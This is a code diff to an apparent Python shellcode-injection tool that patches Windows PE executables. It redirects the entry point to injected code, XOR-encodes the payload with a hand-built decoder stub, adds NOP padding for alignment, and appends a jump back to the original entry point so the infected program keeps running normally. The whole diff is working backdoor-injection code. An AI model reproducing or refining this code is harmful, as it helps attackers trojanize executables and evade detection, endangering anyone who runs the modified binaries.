@@ -298,21 +298,23 @@ origEntryPoint = (pe.OPTIONAL_HEADER.AddressOfEntryPoint)
 # Perform injection - Info not set
 if args.info is False:
 
-    # Sets new Entry Point and formats based upon whether ASLR was enabled
-    if aslr:
-        aslr_ep = newEntryPoint - image_base
+    # Sets new Entry Point and aligns address
+    aslr_ep = newEntryPoint - image_base
+    epAdjustedSize = 0
 
-        if aslr_ep % 4 == 0:
-            pe.OPTIONAL_HEADER.AddressOfEntryPoint = aslr_ep
-        else:
-            aslr_ep = (aslr_ep % 4) + aslr_ep
-            pe.OPTIONAL_HEADER.AddressOfEntryPoint = aslr_ep
-
-        print(PrintBlue("[i]") + " New Entry Point:\t\t"  '0x{:08x}'.format(aslr_ep))
-
+    if aslr_ep % 4 == 0:
+        pe.OPTIONAL_HEADER.AddressOfEntryPoint = aslr_ep
     else:
-        pe.OPTIONAL_HEADER.AddressOfEntryPoint = newRawOffset
-        print (PrintBlue("[i]") + " New Entry Point:\t\t"  '0x{:08x}'.format(newRawOffset))
+        epAdjustedSize = (4 - (aslr_ep % 4))
+        aslr_ep = (4 - (aslr_ep % 4)) + aslr_ep
+
+        pe.OPTIONAL_HEADER.AddressOfEntryPoint = aslr_ep
+
+    print(PrintBlue("[i]") + " New Entry Point:\t\t"  '0x{:08x}'.format(aslr_ep))
+    #
+    # else:
+    #     pe.OPTIONAL_HEADER.AddressOfEntryPoint = newRawOffset
+    #     print (PrintBlue("[i]") + " New Entry Point:\t\t"  '0x{:08x}'.format(newRawOffset))
 
     # Reformat original instruction return address to little endian
     if x64:
@@ -352,21 +354,37 @@ if args.info is False:
             xorDecoder += b"\x40"
             xorDecoder += b"\x3d" + endDecodeAddressLittle
             xorDecoder += b"\x7e\xf5"
-
-
             shellcode = xorDecoder + (xor(shellcode, encodingKey))
 
     if x64:
+        # Balance address to  %4 b
+
         # Add return address for original program execution
         # mov rax, addr
         # jmp rax
-        shellcode += (b"\x48\xb8" + returnAddress + b"\xFF\xe0")
+        shellcode += (b"\x48\xb8" + returnAddress)
+
+        paddingBytes = b""
+        if len(shellcode) % 4 != 0:
+            paddingBytes = b"\x90" * epAdjustedSize
+            print (len(paddingBytes))
+            shellcode += paddingBytes
+
+        shellcode += (b"\xFF\xe0")
 
     else:
         # Add return address for original program execution
         # mov eax, addr
         # call eax
-        shellcode += (b"\xB8" + returnAddress + b"\xFF\xD0")
+        shellcode += (b"\xB8" + returnAddress)
+
+        paddingBytes = b""
+        if len(shellcode) % 4 != 0:
+            paddingBytes = b"\x90" * epAdjustedSize
+            print (len(paddingBytes))
+            shellcode += paddingBytes
+
+        shellcode += (b"\xFF\xD0")
 
     # Prepend 4 NOPS to shellcode for padding
     shellcode = b"\x90\x90\x90\x90" + shellcode
